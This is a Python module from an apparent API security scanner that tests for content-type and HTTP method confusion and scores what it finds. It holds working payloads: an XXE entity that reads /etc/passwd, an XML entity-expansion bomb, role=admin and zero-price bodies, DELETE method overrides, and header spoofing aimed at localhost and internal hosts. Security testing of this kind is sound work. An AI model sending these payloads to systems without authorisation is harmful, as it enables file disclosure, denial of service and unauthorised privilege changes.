"""Content-Type and Method Confusion — JSON/XML/form-data switching, method override.

A real attacker doesn't just send what the API expects.
They send what the API DOESN'T expect. And hope it breaks.

This module:
1. Tests Content-Type switching (JSON → XML → form-data → plain text)
2. Tests HTTP method override (POST → PUT → PATCH → DELETE)
3. Tests parameter injection via different content types
4. Tests JSON/XML parsing vulnerabilities
5. Tests charset encoding confusion
"""


from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any

from titan.core.logger import get_logger
from titan.core.models import AttackType, Finding, Severity

logger = get_logger("confusion")



@dataclass
class ConfusionPayload:
    """A content-type/method confusion payload."""
    name: str
    content_type: str
    body: str
    method_override: str | None
    severity: Severity
    confidence: float


class ConfusionTester:
    """Test content-type and method confusion vulnerabilities."""

    # ── Content-Type Switching Payloads ─────────────────────────────────

    CONTENT_TYPE_PAYLOADS = [
        # XML injection
        ConfusionPayload(
            name="xml_injection",
            content_type="application/xml",
            body='<?xml version="1.0"?><root><role>admin</role><amount>0</amount></root>',
            method_override=None,
            severity=Severity.CRITICAL,
            confidence=0.70,
        ),
        ConfusionPayload(
            name="xml_entity_expansion",
            content_type="application/xml",
            body='<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
            method_override=None,
            severity=Severity.CRITICAL,
            confidence=0.65,
        ),
        ConfusionPayload(
            name="xml_bomb",
            content_type="application/xml",
            body='<?xml version="1.0"?><!DOCTYPE bomb [<!ENTITY a "aaa"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;"><!ENTITY c "&b;&b;&b;&b;&b;&b;"><!ENTITY d "&c;&c;&c;&c;&c;&c;">]><bomb>&d;</bomb>',
            method_override=None,
            severity=Severity.HIGH,
            confidence=0.55,
        ),

        # Form-data injection
        ConfusionPayload(
            name="multipart_formdata",
            content_type="multipart/form-data",
            body="--boundary\r\nContent-Disposition: form-data; name=\"role\"\r\n\r\nadmin\r\n--boundary\r\nContent-Disposition: form-data; name=\"amount\"\r\n\r\n0\r\n--boundary--",
            method_override=None,
            severity=Severity.HIGH,
            confidence=0.65,
        ),

        # URL-encoded form
        ConfusionPayload(
            name="urlencoded_role",
            content_type="application/x-www-form-urlencoded",
            body="role=admin&amount=0&is_admin=true",
            method_override=None,
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        ConfusionPayload(
            name="urlencoded_injection",
            content_type="application/x-www-form-urlencoded",
            body="price=0&quantity=-1&discount=100&coupon=FREE",
            method_override=None,
            severity=Severity.CRITICAL,
            confidence=0.75,
        ),

        # Plain text
        ConfusionPayload(
            name="plaintext_injection",
            content_type="text/plain",
            body="admin",
            method_override=None,
            severity=Severity.MEDIUM,
            confidence=0.45,
        ),

        # JSON with special content
        ConfusionPayload(
            name="json_injection",
            content_type="application/json",
            body='{"role": "admin", "amount": 0, "_internal": true}',
            method_override=None,
            severity=Severity.HIGH,
            confidence=0.70,
        ),
        ConfusionPayload(
            name="json_array_body",
            content_type="application/json",
            body='[{"role": "admin"}, {"amount": 0}]',
            method_override=None,
            severity=Severity.HIGH,
            confidence=0.60,
        ),
        ConfusionPayload(
            name="json_deep_nesting",
            content_type="application/json",
            body='{"a": {"b": {"c": {"d": {"role": "admin"}}}}}',
            method_override=None,
            severity=Severity.MEDIUM,
            confidence=0.55,
        ),
    ]

    # ── Method Override Payloads ───────────────────────────────────────

    METHOD_OVERRIDE_PAYLOADS = [
        ConfusionPayload(
            name="method_override_delete",
            content_type="application/json",
            body='{"_method": "DELETE"}',
            method_override="DELETE",
            severity=Severity.HIGH,
            confidence=0.65,
        ),
        ConfusionPayload(
            name="method_override_put",
            content_type="application/json",
            body='{"_method": "PUT", "role": "admin"}',
            method_override="PUT",
            severity=Severity.HIGH,
            confidence=0.65,
        ),
        ConfusionPayload(
            name="x_http_method_override",
            content_type="application/json",
            body='{"role": "admin"}',
            method_override="PUT",
            severity=Severity.HIGH,
            confidence=0.60,
        ),
    ]

    # ── Header Confusion ───────────────────────────────────────────────

    HEADER_CONFUSION_PAYLOADS = [
        # X-HTTP-Method-Override
        {"X-HTTP-Method-Override": "DELETE"},
        {"X-HTTP-Method": "DELETE"},
        {"X-Method-Override": "DELETE"},
        # X-Forwarded
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        # Host manipulation
        {"Host": "localhost"},
        {"X-Forwarded-Host": "internal-api.local"},
        # Content type switching
        {"Accept": "application/xml"},
        {"Content-Type": "application/xml"},
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: list[Finding] = []

    async def test_content_type_confusion(
        self,
        target_url: str,
        url: str,
        method: str,
        params: dict[str, Any],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test Content-Type switching."""
        findings = []

        # Get baseline with JSON
        baseline = await self._send_json(url, method, params, auth_headers)
        if baseline is None:
            return findings

        for payload in self.CONTENT_TYPE_PAYLOADS:
            try:
                response = await self._send_raw(
                    url, method, payload.body, payload.content_type, auth_headers
                )
                if response is None:
                    continue

                status = response.get("status", 0)
                resp_body = response.get("body", "")

                if status in (200, 201, 202) and resp_body != baseline.get("body", ""):
                    # Check if different content type was accepted
                    if not any(kw in resp_body.lower() for kw in ["unsupported", "invalid", "error", "bad request"]):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method.upper(),
                            param="content_type",
                            location="header",
                            payload=f"Content-Type: {payload.content_type}",
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            verified=True,
                            confidence=payload.confidence,
                            status=status,
                            body=resp_body[:2000],
                            diffs=[f"confusion:{payload.name}"],
                            baseline_body=baseline.get("body", "")[:2000],
                            baseline_status=baseline.get("status", 0),
                            verification_body=resp_body[:2000],
                            verification_status=status,
                            notes=f"Content-Type confusion: Server accepted {payload.content_type}",
                        )
                        findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    async def test_method_override(
        self,
        target_url: str,
        url: str,
        method: str,
        params: dict[str, Any],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test HTTP method override."""
        findings = []

        # Get baseline
        baseline = await self._send_json(url, method, params, auth_headers)
        if baseline is None:
            return findings

        for payload in self.METHOD_OVERRIDE_PAYLOADS:
            try:
                # Send as POST but with method override in body/headers
                headers = {**(auth_headers or {})}
                if payload.name == "x_http_method_override":
                    headers["X-HTTP-Method-Override"] = payload.method_override

                response = await self._send_raw(
                    url, "POST", payload.body, payload.content_type, headers
                )
                if response is None:
                    continue

                status = response.get("status", 0)
                resp_body = response.get("body", "")

                if status in (200, 201, 202, 204):
                    # Check if method override was accepted
                    if resp_body != baseline.get("body", "") or status != baseline.get("status", 0):
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=f"POST->{payload.method_override}",
                            param="method_override",
                            location="body",
                            payload=payload.body,
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            verified=True,
                            confidence=payload.confidence,
                            status=status,
                            body=resp_body[:2000],
                            diffs=[f"method_override:{payload.name}"],
                            baseline_body=baseline.get("body", "")[:2000],
                            baseline_status=baseline.get("status", 0),
                            verification_body=resp_body[:2000],
                            verification_status=status,
                            notes=f"Method override: Server accepted {payload.method_override} via {payload.name}",
                        )
                        findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    async def test_header_confusion(
        self,
        target_url: str,
        url: str,
        method: str,
        params: dict[str, Any],
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test header-based confusion."""
        findings = []

        baseline = await self._send_json(url, method, params, auth_headers)
        if baseline is None:
            return findings

        for header_payload in self.HEADER_CONFUSION_PAYLOADS:
            try:
                headers = {**(auth_headers or {}), **header_payload}
                response = await self._send_json(url, method, params, headers)
                if response is None:
                    continue

                status = response.get("status", 0)
                resp_body = response.get("body", "")

                if status in (200, 201, 202) and resp_body != baseline.get("body", ""):
                    header_name = list(header_payload.keys())[0]
                    finding = Finding(
                        target=target_url,
                        url=url,
                        method=method.upper(),
                        param=header_name.lower(),
                        location="header",
                        payload=json.dumps(header_payload),
                        attack_type=AttackType.BUSINESS_LOGIC,
                        severity=Severity.HIGH,
                        verified=True,
                        confidence=0.60,
                        status=status,
                        body=resp_body[:2000],
                        diffs=[f"header_confusion:{header_name}"],
                        baseline_body=baseline.get("body", "")[:2000],
                        baseline_status=baseline.get("status", 0),
                        verification_body=resp_body[:2000],
                        verification_status=status,
                        notes=f"Header confusion: Server responded differently to {header_name}",
                    )
                    findings.append(finding)

            except Exception as exc:
                logger.debug(f"variant failed, continuing: {exc}")
                continue

        self._findings.extend(findings)
        return findings

    # ── Helpers ────────────────────────────────────────────────────────

    async def _send_json(self, url, method, params, headers=None):
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                h = {**(headers or {}), "Content-Type": "application/json"}
                if method.upper() == "GET":
                    async with session.get(url, params=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "POST":
                    async with session.post(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PUT":
                    async with session.put(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
                elif method.upper() == "PATCH":
                    async with session.patch(url, json=params, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    async def _send_raw(self, url, method, body, content_type, headers=None):
        try:
            import aiohttp
            async with aiohttp.ClientSession() as session:
                h = {**(headers or {}), "Content-Type": content_type}
                async with session.request(
                    method.upper(), url, data=body, headers=h, timeout=aiohttp.ClientTimeout(total=5)
                ) as resp:
                    return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def get_findings(self) -> list[Finding]:
        return self._findings
